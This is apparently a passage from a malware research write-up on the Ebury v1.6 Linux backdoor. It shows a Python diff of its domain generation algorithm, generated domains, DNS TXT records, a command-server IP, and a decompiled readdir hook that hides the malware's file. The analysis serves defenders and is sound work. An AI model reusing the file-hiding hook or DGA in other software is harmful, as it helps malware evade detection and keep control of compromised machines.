			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">diff</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
@@ -4,11 +4,11 @@
     ords = lambda c: struct.unpack("b", c)[0]
     TLDS = [ 'info', 'net', 'biz' ]
     KEY = "fmqzdnvcyelwaibsrxtpkhjguo"
-    h = "%x" % ((domain_no * domain_no + 4091073) &amp; 0xFFFFFFFF)
+    h = "%x" % ((domain_no * domain_no + 3807225) &amp; 0xFFFFFFFF)
     g = ""
     for i in range(len(h))[::-1]:
-        g += KEY[((ords(h[i]) * 4906) + (ords(h[-1]) + i + domain_no)) % len(KEY)]
+        g += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)]
         g += h[i]
-    g += KEY[((ords(h[-1]) * 6816) + (len(h) + domain_no - 1)) % len(KEY)]
+    g += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)]
     g += '.%s' % TLDS[domain_no % len(TLDS)]
     return g</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803029998378316-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-2">2</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-4">4</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-6">6</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-8">8</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-10">10</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-12">12</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803029998378316-14">14</div><div class="crayon-num" data-line="crayon-60581b9803029998378316-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803029998378316-1"><span class="crayon-c">@@ -4,11 +4,11 @@</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-2"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; ords = lambda c: struct.unpack("b", c)[0]</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-3"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; TLDS = [ 'info', 'net', 'biz' ]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-4"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; KEY = "fmqzdnvcyelwaibsrxtpkhjguo"</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-5"><span class="crayon-cn ">-&nbsp;&nbsp;&nbsp;&nbsp;h = "%x" % ((domain_no * domain_no + 4091073) &amp; 0xFFFFFFFF)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-6"><span class="crayon-s ">+&nbsp;&nbsp;&nbsp;&nbsp;h = "%x" % ((domain_no * domain_no + 3807225) &amp; 0xFFFFFFFF)</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-7"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; g = ""</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-8"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; for i in range(len(h))[::-1]:</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-9"><span class="crayon-cn ">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g += KEY[((ords(h[i]) * 4906) + (ords(h[-1]) + i + domain_no)) % len(KEY)]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-10"><span class="crayon-s ">+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)]</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-11"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g += h[i]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-12"><span class="crayon-cn ">-&nbsp;&nbsp;&nbsp;&nbsp;g += KEY[((ords(h[-1]) * 6816) + (len(h) + domain_no - 1)) % len(KEY)]</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-13"><span class="crayon-s ">+&nbsp;&nbsp;&nbsp;&nbsp;g += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803029998378316-14"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; g += '.%s' % TLDS[domain_no % len(TLDS)]</span></div><div class="crayon-line" id="crayon-60581b9803029998378316-15"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp; return g</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Figure 2</strong>. Differences between DGA in v1.4 and v1.6 implemented in Python</p>
<p>The first ten domains generated by the DGA are:</p>
<ul>
<li>larfj7g1vaz3y.net</li>
<li>idkff7m1lac3g.biz</li>
<li>u2s0k8d1ial3r.info</li>
<li>h9g0q8a1hat3s.net</li>
<li>f2y1j8v1saa3t.biz</li>
<li>xdc1h8n1baw3m.info</li>
<li>raj2p8z1aae3b.net</li>
<li>o9f3v8r1oaj3p.biz</li>
<li>tav4h8n1baw3r.info</li>
<li>hdm5o8e1tas3n.net</li>
</ul>
<p>Ebury sequentially tries the generated domain names until it finds one that has a TXT record set by the operator. To verify the ownership of the domain, Ebury checks whether the TXT record can be decrypted using an RSA public key embedded in its code:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980302b258867437" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAOadSGBGG9x/f1/U6KdwxfGzqSj5Bcy4aZpKv77uN4xYdS5HWmEub5Rj
nAvtKybupWb3AUWwN7UPIO+2R+v6hrF+Gh2apcs9I9G7VEBiToi2B6BiZ3Ly68kj
1ojemjtrG+g//Ckw/osESWweSWY4nJFKa5QJzT39ErUZim2FPDmvAgMBAAE=
-----END RSA PUBLIC KEY-----</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980302b258867437-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980302b258867437-2">2</div><div class="crayon-num" data-line="crayon-60581b980302b258867437-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980302b258867437-4">4</div><div class="crayon-num" data-line="crayon-60581b980302b258867437-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980302b258867437-1">-----BEGIN RSA PUBLIC KEY-----</div><div class="crayon-line crayon-striped-line" id="crayon-60581b980302b258867437-2">MIGJAoGBAOadSGBGG9x/f1/U6KdwxfGzqSj5Bcy4aZpKv77uN4xYdS5HWmEub5Rj</div><div class="crayon-line" id="crayon-60581b980302b258867437-3">nAvtKybupWb3AUWwN7UPIO+2R+v6hrF+Gh2apcs9I9G7VEBiToi2B6BiZ3Ly68kj</div><div class="crayon-line crayon-striped-line" id="crayon-60581b980302b258867437-4">1ojemjtrG+g//Ckw/osESWweSWY4nJFKa5QJzT39ErUZim2FPDmvAgMBAAE=</div><div class="crayon-line" id="crayon-60581b980302b258867437-5">-----END RSA PUBLIC KEY-----</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803031155356484" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
larfj7g1vaz3y.net.  1737  IN  A 78.140.134.7
larfj7g1vaz3y.net.  285   IN  TXT "ItTFyJ6tegXn9HkHa+XZX1+fZw0IsfhXl05phu1F7ZXDP4HtKMvrXW8NbUSjY8vkQgDdKsSaSCyrvfkhHodhVQLhIKJJY64HeoInb3m4SCNZNOhx9qjYRnuR0Ci7BHNWakJC/QdoQ4UNKkOrvvb42kN7TU6jqZCYBtusXd37tNg="</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803031155356484-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803031155356484-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803031155356484-1"><span class="crayon-v">larfj7g1vaz3y</span><span class="crayon-sy">.</span><span class="crayon-v">net</span><span class="crayon-sy">.</span> <span class="crayon-h"> </span><span class="crayon-cn">1737</span> <span class="crayon-h"> </span><span class="crayon-st">IN</span> <span class="crayon-h"> </span><span class="crayon-i">A</span><span class="crayon-h"> </span><span class="crayon-cn">78.140.134.7</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803031155356484-2"><span class="crayon-v">larfj7g1vaz3y</span><span class="crayon-sy">.</span><span class="crayon-v">net</span><span class="crayon-sy">.</span> <span class="crayon-h"> </span><span class="crayon-cn">285</span>  <span class="crayon-h"> </span><span class="crayon-st">IN</span> <span class="crayon-h"> </span><span class="crayon-i">TXT</span><span class="crayon-h"> </span><span class="crayon-s">"ItTFyJ6tegXn9HkHa+XZX1+fZw0IsfhXl05phu1F7ZXDP4HtKMvrXW8NbUSjY8vkQgDdKsSaSCyrvfkhHodhVQLhIKJJY64HeoInb3m4SCNZNOhx9qjYRnuR0Ci7BHNWakJC/QdoQ4UNKkOrvvb42kN7TU6jqZCYBtusXd37tNg="</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Figure 3</strong>. DNS records for larfj7g1vaz3y[.]net:</p>
<p>The A record on the domain is ignored by Ebury.</p>
<p>The decrypted data has three comma-separated fields. Here’s an example of the data stored in the DNS entry for larfj7g1vaz3y[.]net in January 2018:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803032286726107" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
larfj7g1vaz3y.net:3328801113:1517346000</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803032286726107-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803032286726107-1">larfj7g1vaz3y.net:3328801113:1517346000</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>The first field contains the domain name so the signed data cannot be reused for another domain. The second field is the C&amp;C server IP address and the third field contains a UNIX timestamp used as the expiration date of the signed data. The expiration date is a new field added as an anti-sinkhole mechanism and is new to v1.6. If anyone were to try to seize or take ownership of both the domain and the IP address of the exfiltration server, then it would only be possible to reuse the signed data for a limited amount of time, reducing the impact of a successful sinkhole attempt — something that did happen for almost all previous versions of the DGA.</p>
<p><strong>Table 1. Decoded information stored in the TXT record<br />
</strong>
<table id="tablepress-430" class="tablepress tablepress-id-430">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Domain name</strong></th><th class="column-2"><strong>IP Address</strong></th><th class="column-3"><strong>Expiration date</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">larfj7g1vaz3y[.]net</td><td class="column-2">0xc6697959 ⇒ 198[.]105.121.89</td><td class="column-3">2018-01-30 @ 9:00pm (UTC)</td>
</tr>
</tbody>
</table>
</p>
<p>We do not believe Ebury&#8217;s operators really expect to use the exfiltration fallback. In the samples we analyzed, multiple bugs were found preventing the fallback routine to execute. This code did definitely not go through a complete testing phase. For that reason, we suspect it might be quite rare for Ebury’s operators to lose access to their infected machines. It is also possible they do not mind losing access to a few machines once in a while, since they control so many compromised systems. Why such efforts are put into a mechanism that is not working anymore remains unclear to us.</p>
<p><strong>Changes summary</strong></p>
<ul>
<li>Slightly modified DGA (constants changed)</li>
<li>Added an expiration date for exfiltration server DNS entry validity</li>
<li>New registered domain: larfj7g1vaz3y[.]net</li>
<li>New exfiltration server IP address: 198[.]105.121.89</li>
</ul>
<p><strong>New features</strong></p>
<p>New functionalities were added in version 1.6. For unknown reasons, these new features were not available on all of the v1.6 samples we analyzed.</p>
<p>Ebury now implements self-hiding techniques usually described as a &#8220;<a href="https://en.wikipedia.org/wiki/Rootkit#User_mode" target="_blank" rel="noopener">userland rootkit</a>&#8220;. To do so, it hooks the <span style="font-family: 'courier new', courier, monospace">readdir</span> or <span style="font-family: 'courier new', courier, monospace">readdir64</span> function, each of which is used to list directory entries. If the next directory structure to return is the Ebury shared library file, the hook skips it and returns the subsequent entry instead.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803033879321323" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
struct dirent *__fastcall readdir(__int64 a1)
{
  struct dirent *dir_entry; // rax
  struct dirent *dir_entry_1; // rbx
  __ino_t inode; // rax

  do
  {
    if ( !readdir_0 )
      readdir_0 = F_resolve_func("readdir");
    dir_entry = readdir_0(a1);
    dir_entry_1 = dir_entry;
    if ( !exports_hook_activated )
      break;
    if ( !dir_entry )
      break;
    if ( !ebury_inode )
      break;
    inode = dir_entry-&gt;d_ino;
    if ( inode != ebury_inode &amp;&amp; inode != ebury_lstat_inode )
      break;
  }
  while ( ebury_filename &amp;&amp; !strncmp(dir_entry_1-&gt;d_name, ebury_filename,
    ebury_filename_len_before_extension) );
  return dir_entry_1;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803033879321323-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-2">2</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-4">4</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-6">6</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-8">8</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-10">10</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-12">12</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-14">14</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-16">16</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-18">18</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-20">20</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-22">22</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-24">24</div><div class="crayon-num" data-line="crayon-60581b9803033879321323-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803033879321323-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803033879321323-1"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-v">dirent</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-e">__fastcall </span><span class="crayon-e">readdir</span><span class="crayon-sy">(</span><span class="crayon-e">__int64 </span><span class="crayon-v">a1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-v">dirent</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">dir_entry</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// rax</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-v">dirent</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">dir_entry_1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// rbx</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">__ino_t </span><span class="crayon-v">inode</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// rax</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-6">&nbsp;</div><div class="crayon-line" id="crayon-60581b9803033879321323-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">do</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">readdir</span><span class="crayon-sy">_</span>0<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">readdir_0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">F_resolve_func</span><span class="crayon-sy">(</span><span class="crayon-s">"readdir"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">dir_entry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">readdir_0</span><span class="crayon-sy">(</span><span class="crayon-v">a1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">dir_entry_1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">dir_entry</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">exports_hook</span><span class="crayon-sy">_</span>activated<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">dir</span><span class="crayon-sy">_</span>entry<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">ebury</span><span class="crayon-sy">_</span>inode<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">inode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">dir_entry</span><span class="crayon-o">-&gt;</span><span class="crayon-v">d_ino</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">inode</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-v">ebury_inode</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">inode</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-v">ebury_lstat</span><span class="crayon-sy">_</span>inode<span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-22"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-23"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">ebury_filename</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span 